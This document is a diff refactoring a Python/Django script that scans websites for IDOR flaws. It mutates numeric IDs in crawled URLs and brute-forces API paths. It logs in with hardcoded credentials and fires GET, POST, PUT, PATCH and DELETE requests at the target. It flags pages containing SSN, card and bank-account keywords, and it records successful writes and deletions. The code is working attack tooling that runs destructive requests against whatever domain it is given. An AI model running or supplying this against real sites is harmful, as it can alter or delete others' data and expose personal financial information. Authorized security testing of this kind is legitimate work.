@@ -1,287 +1,347 @@
-from curses.ascii import isdigit
-import os, django, re, sys
-from platform import machine
-BASE_DIR = os.path.dirname(os.path.abspath('./Wrapper'))
+import os
+import re
+import sys
+
+import django
+
+BASE_DIR = os.path.dirname(os.path.abspath("./Wrapper"))
 sys.path.append(BASE_DIR)
-os.environ['DJANGO_SETTINGS_MODULE'] = 'Wrapper.settings'
+os.environ["DJANGO_SETTINGS_MODULE"] = "Wrapper.settings"
 django.setup()
-from common import main_common_pattern_to_traverse_a_website as MAIN_COMMON_PATTERN
-from django.db import transaction
-import requests
-from core.models import LinkActionItem, LinkActionItemPost, LinkActionItemResponse, FormItem, FormDetailsItem, LinkItem
-from bs4 import BeautifulSoup
 
-LOGIN_LINK = ['login','Login','signin','sessions']
-SANSATIVE_INFO = ["social security numbers","ssn", "driver license number", "financial identifiers", "citizen visa code","test scores", "Biometric identifiers", "Account balances", "Bank account number", "credit card number", "payment history", "income history", "expiration","CVV","CVV2","PIN","BIN"]
+import requests  # noqa: E402  (import after django.setup)
+from bs4 import BeautifulSoup  # noqa: E402
+from django.db import transaction  # noqa: E402
 
+from common import (  # noqa: E402
+    main_common_pattern_to_traverse_a_website as MAIN_COMMON_PATTERN,
+)
+from core.models import (  # noqa: E402
+    LinkActionItem,
+    LinkActionItemPost,
+    LinkActionItemResponse,
+    LinkItem,
+)
+
+LOGIN_LINK = ["login", "Login", "signin", "sessions"]
+SENSITIVE_INFO = [
+    "social security numbers",
+    "ssn",
+    "driver license number",
+    "financial identifiers",
+    "citizen visa code",
+    "test scores",
+    "biometric identifiers",
+    "account balances",
+    "bank account number",
+    "credit card number",
+    "payment history",
+    "income history",
+    "expiration",
+    "cvv",
+    "cvv2",
+    "pin",
+    "bin",
+]
 
 os.system("clear")
 
+
 def _get_url():
-    os.chdir('idord_infograther')
-    file= open("link_to_crawl.txt","r")
+    """Return the target domain saved by the crawler step."""
+    path = os.path.join("idord_infograther", "link_to_crawl.txt")
     try:
-        return file.readline()
-    except:
+        with open(path, "r") as handle:
+            return handle.readline().strip()
+    except OSError:
         return None
 
-def _get_api():
-    return [f"http://api.{BASE_LINK}",f"http://{BASE_LINK}",f"https://api.{BASE_LINK}",f"https://{BASE_LINK}"]
+
+def _get_api(base_link):
+    """Build the candidate API/base URLs (with schemes) for the target."""
+    return [
+        f"http://api.{base_link}",
+        f"http://{base_link}",
+        f"https://api.{base_link}",
+        f"https://{base_link}",
+    ]
+
 
 BASE_LINK = _get_url()
-API_LINKS = _get_api()
-BASE_LINK_GET = "http://"+BASE_LINK
+API_LINKS = _get_api(BASE_LINK)
+# Fetchable base URL (requests needs an explicit scheme).
+BASE_LINK_GET = f"http://{BASE_LINK}"
 
 
- 
-def has_numbers(inputString):
-    return any(char.isdigit() for char in inputString)
-
+def has_numbers(input_string):
+    """True if the string contains at least one digit."""
+    return any(char.isdigit() for char in input_string)
 
 
 @transaction.atomic
-def generateAttack():
-
+def generate_attack():
+    """Generate manipulated links/payloads for every crawled link."""
     for link in LinkItem.objects.all():
-        if(has_numbers(link.link)):
-            matching = re.split("\W+",str(link.link))
-            for i in range(len(matching)):
-                
-                original= matching[i]
-                
+        if not has_numbers(link.link):
+            continue
+
+        matching = re.split(r"\W+", str(link.link))
+        for i in range(len(matching)):
+            original = matching[i]
+
+            # Only mutate purely numeric path/query segments.
+            if not original.isdigit():
+                continue
+
+            for j in range(10):
+                matching[i] = str(j)
+                mutated_path = "/".join(matching)
                 try:
-                    if isdigit(original):
-                        for j in range(10):
-                            matching[i]=str(j)
-                            obj = LinkActionItem.objects.create(link=BASE_LINK+'/'.join(matching),orginal_param=original,manupulated_param=matching[i])
-                            obj.save()
-                            for API_LINK in API_LINKS:
-                                obj2 = LinkActionItem.objects.create(link=API_LINK+'/'.join(matching),orginal_param=original,manupulated_param=matching[i])
-                                obj2.save()
-                except Exception as e:        
+                    LinkActionItem.objects.create(
+                        link=f"{BASE_LINK_GET}{mutated_path}",
+                        orginal_param=original,
+                        manupulated_param=matching[i],
+                    )
+                except Exception:
                     pass
 
-    try:
-        for API_LINK in API_LINKS:
-            for i in MAIN_COMMON_PATTERN:
-                for j in range(10):
+                for api_link in API_LINKS:
                     try:
-                        obj2 = LinkActionItem.objects.create(link=(API_LINK+'/'+str(i)+'/'+str(j)),manupulated_param=str(j))
-                        obj2.save()
-                    except:
+                        LinkActionItem.objects.create(
+                            link=f"{api_link}{mutated_path}",
+                            orginal_param=original,
+                            manupulated_param=matching[i],
+                        )
+                    except Exception:
                         pass
 
-    except Exception as e:
-        pass
-    
-    
-    try:
-        for API_LINK in API_LINKS:
-            for i in MAIN_COMMON_PATTERN:
-                #print(API_LINK+'/'+str(i))
+            # Restore the original segment before moving on.
+            matching[i] = original
+
+    # Brute-force common resource patterns with numeric ids (GET/PUT/... targets).
+    for api_link in API_LINKS:
+        for pattern in MAIN_COMMON_PATTERN:
+            for j in range(10):
                 try:
-                    obj4 = LinkActionItemPost.objects.create(link=(API_LINK+'/'+str(i)))
-                    obj4.save()
-                except:
+                    LinkActionItem.objects.create(
+                        link=f"{api_link}/{pattern}/{j}",
+                        manupulated_param=str(j),
+                    )
+                except Exception:
                     pass
 
-    except Exception as e:
-        pass
-            
-generateAttack()
+    # Common resource patterns as POST targets.
+    for api_link in API_LINKS:
+        for pattern in MAIN_COMMON_PATTERN:
+            try:
+                LinkActionItemPost.objects.create(link=f"{api_link}/{pattern}")
+            except Exception:
+                pass
 
-def checkSansativeInfo(html_page):
 
-    soup = BeautifulSoup(html_page, 'html.parser')
+generate_attack()
+
+
+def check_sensitive_info(html_page):
+    """Return the sensitive keywords found in the page's text nodes."""
+    soup = BeautifulSoup(html_page, "html.parser")
     result = []
-    for th in soup.find_all('th'):
-        for sn in SANSATIVE_INFO:
-            if str(th.text).lower() == sn:
-               result.append(sn) 
-
-    for th in soup.find_all('p'):
-        for sn in SANSATIVE_INFO:
-            if str(th.text).lower() == sn:
-                result.append(sn)
-
-
-    for th in soup.find_all('td'):
-        for sn in SANSATIVE_INFO:
-            if str(th.text).lower() == sn:
-                result.append(sn)
-    
-
-    for th in soup.find_all('header'):
-        for sn in SANSATIVE_INFO:
-            if str(th.text).lower() == sn:
-                result.append(sn)
-    
-    for th in soup.find_all('script'):
-        for sn in SANSATIVE_INFO:
-            if str(th.text).lower() == sn:
-                result.append(sn)
-
+    for tag_name in ("th", "p", "td", "header", "script"):
+        for element in soup.find_all(tag_name):
+            text = str(element.text).lower().strip()
+            for keyword in SENSITIVE_INFO:
+                if text == keyword:
+                    result.append(keyword)
     return result
 
 
+def _login_headers(response):
+    """Extract the session headers we want to replay from a login response."""
+    headers = dict(response.headers)
+    replay = {}
+    if "Set-Cookie" in headers:
+        replay["Set-Cookie"] = headers["Set-Cookie"]
+    if "X-Request-Id" in headers:
+        replay["X-Request-Id"] = headers["X-Request-Id"]
+    return replay
+
 
 def get_attack():
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    payload = {'email':'a@a.com','password':'ashikashik'}
+    headers = {"User-Agent": "Mozilla/5.0"}
+    payload = {"email": "a@a.com", "password": "ashikashik"}
     session = requests.Session()
 
-    #login scripts
-    r = ""
-    for i in LOGIN_LINK:
-        r = session.post(BASE_LINK_GET+f"/{i}/",headers=headers,data=payload)
-        if(r.status_code==200):
-            r = r 
-            break
-    header = dict(r.headers)
-
-    linkActionItem = LinkActionItem.objects.all()
-    for actionItem in linkActionItem:
-
+    # Try the known login endpoints until one accepts the credentials.
+    response = None
+    for path in LOGIN_LINK:
         try:
-            data = session.get(actionItem.link,headers={'Set-Cookie':header['Set-Cookie'],'X-Request-Id':header['X-Request-Id']})
-            if data.text is not None:
-                result = checkSansativeInfo(data.text)
-                
-                if len(result)>0:
-                    print(f"___________________________________________________\nGET : {actionItem.link}")
-                    print("_____________________________________________________")
-                    return 1
-                
-        except Exception as e:
-            pass
+            response = session.post(
+                f"{BASE_LINK_GET}/{path}/", headers=headers, data=payload
+            )
+        except requests.RequestException:
+            continue
+        if response.status_code == 200:
+            break
 
+    if response is None:
+        return None
 
-def attack():
-    
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    payload = {'email':'a@a.com','password':'ashikashik'}
+    replay_headers = _login_headers(response)
 
-    session = requests.Session()
-    r = session.post(BASE_LINK+'/sessions/',headers=headers,data=payload)
+    for action_item in LinkActionItem.objects.all():
+        try:
+            data = session.get(action_item.link, headers=replay_headers)
+        except requests.RequestException:
+            continue
 
-    header = dict(r.headers)
-    d = session.get(BASE_LINK+"/dashboard/home",headers={'Set-Cookie':header['Set-Cookie'],'X-Request-Id':header['X-Request-Id']})
+        if data.text is None:
+            continue
 
+        result = check_sensitive_info(data.text)
+        if result:
+            print(
+                "___________________________________________________\n"
+                f"GET : {action_item.link}"
+            )
+            print("_____________________________________________________")
+            return 1
+
+    return None
 
 
 def post_attack():
-    links  = LinkActionItemPost.objects.all()
-
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    payload = {'title':'actualHack on post method','name':'actualHackName on post method'}
+    headers = {"User-Agent": "Mozilla/5.0"}
+    payload = {
+        "title": "actualHack on post method",
+        "name": "actualHackName on post method",
+    }
     session = requests.Session()
 
-    
-    for l in links:
+    for link in LinkActionItemPost.objects.all():
         try:
-            r = session.post(l.link,headers=headers,data=payload)
-            if r.status_code == 201:
-                
-                print(f"______________________________________________\nPOST IDOR: {l.link}")
-                LinkActionItemResponse.objects.create(action="post",action_link = l.link,status="post_idor",tag="Hacker Can create a new entry in your database")
-                print("_______________________________________________")
-                return 1
-        except:
-            pass
+            response = session.post(link.link, headers=headers, data=payload)
+        except requests.RequestException:
+            continue
 
+        if response.status_code == 201:
+            print(
+                "______________________________________________\n"
+                f"POST IDOR: {link.link}"
+            )
+            LinkActionItemResponse.objects.create(
+                action="post",
+                action_link=link.link,
+                status="post_idor",
+                tag="Hacker Can create a new entry in your database",
+            )
+            print("_______________________________________________")
+            return 1
+
+    return None
 
 
 def put_attack():
-    links  = LinkActionItem.objects.all()
-
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    payload = {'title':'actualHack on put method','name':'actualHackName on put method'}
+    headers = {"User-Agent": "Mozilla/5.0"}
+    payload = {
+        "title": "actualHack on put method",
+        "name": "actualHackName on put method",
+    }
     session = requests.Session()
 
-   
-    for l in links:
+    for link in LinkActionItem.objects.all():
         try:
-            
-            r = session.put(l.link,headers=headers,data=payload)
-            # print(l.link,r.status_code)
-            if r.status_code ==200:
-                
-                print(f"______________________________________________\nPUT IDOR: {l.link}")
-                LinkActionItemResponse.objects.create(action="put",action_link = l.link,status="put_idor",tag="Hacker Can changes your database")
-                print("________________________________________________")
-                return 1
-        except:
-            pass
+            response = session.put(link.link, headers=headers, data=payload)
+        except requests.RequestException:
+            continue
 
+        if response.status_code == 200:
+            print(
+                "______________________________________________\n"
+                f"PUT IDOR: {link.link}"
+            )
+            LinkActionItemResponse.objects.create(
+                action="put",
+                action_link=link.link,
+                status="put_idor",
+                tag="Hacker Can changes your database",
+            )
+            print("________________________________________________")
+            return 1
 
+    return None
 
 
 def patch_attack():
-    links  = LinkActionItem.objects.all()
-
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    payload = {'title':'actualHack on patch method','name':'actualHackName on patch method'}
+    headers = {"User-Agent": "Mozilla/5.0"}
+    payload = {
+        "title": "actualHack on patch method",
+        "name": "actualHackName on patch method",
+    }
     session = requests.Session()
 
-   
-    for l in links:
+    for link in LinkActionItem.objects.all():
         try:
-            r = session.patch(l.link,headers=headers,data=payload)
-            if r.status_code == 200:
+            response = session.patch(link.link, headers=headers, data=payload)
+        except requests.RequestException:
+            continue
 
-                print(f"______________________________________________\nPATCH IDOR: {l.link}")
-                LinkActionItemResponse.objects.create(action="patch",action_link = l.link,status="patch_idor",tag="Hacker Can changes your database")
-                print("________________________________________________")
-                return 1
-        except:
-            pass
+        if response.status_code == 200:
+            print(
+                "______________________________________________\n"
+                f"PATCH IDOR: {link.link}"
+            )
+            LinkActionItemResponse.objects.create(
+                action="patch",
+                action_link=link.link,
+                status="patch_idor",
+                tag="Hacker Can changes your database",
+            )
+            print("________________________________________________")
+            return 1
 
+    return None
 
 
 def delete_attack():
-    links  = LinkActionItem.objects.all()
-
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    payload = {'title':'actualHack on delete method','name':'actualHackName on delete method'}
+    headers = {"User-Agent": "Mozilla/5.0"}
     session = requests.Session()
 
-   
-    for l in links:
+    for link in LinkActionItem.objects.all():
         try:
-            r = session.delete(l.link,headers=headers)
-            if r.status_code == 200:
-                
-                print(f"______________________________________________\nDELETE IDOR:{l.link}")
-                LinkActionItemResponse.objects.create(action="delete",action_link = l.link,status="delete_idor",tag="Hacker Can delete your database entry")
-                print("________________________________________________")
-                return 1
-        except:
-            pass
+            response = session.delete(link.link, headers=headers)
+        except requests.RequestException:
+            continue
+
+        if response.status_code == 200:
+            print(
+                "______________________________________________\n"
+                f"DELETE IDOR:{link.link}"
+            )
+            LinkActionItemResponse.objects.create(
+                action="delete",
+                action_link=link.link,
+                status="delete_idor",
+                tag="Hacker Can delete your database entry",
+            )
+            print("________________________________________________")
+            return 1
+
+    return None
 
 
+def run_attacks():
+    """Run each attack type, stopping at the first confirmed finding."""
+    checks = (
+        (get_attack, "GET"),
+        (post_attack, "POST"),
+        (put_attack, "PUT"),
+        (patch_attack, "PATCH"),
+        (delete_attack, "DELETE"),
+    )
+    for attack, label in checks:
+        if attack():
+            return
+        print(f"No {label} IDOR Vulnerability Found")
 
-for i in range(1):
-    if(get_attack()):
-        break
-    else:
-        print("No GET IDOR Vulnerability Found")
 
-    if(post_attack()):
-        break
-    else:
-        print("No POST IDOR Vulnerability Found")
-
-    if(put_attack()):
-        break
-    else:
-        print("No PUT IDOR Vulnerability Found")
-    if(patch_attack()):
-        break
-    else:
-        print("No PATCH IDOR Vulnerability Found")
-
-    if(delete_attack()):
-        break
-    else:
-        print("No DELETE IDOR Vulnerability Found")
-
+run_attacks()
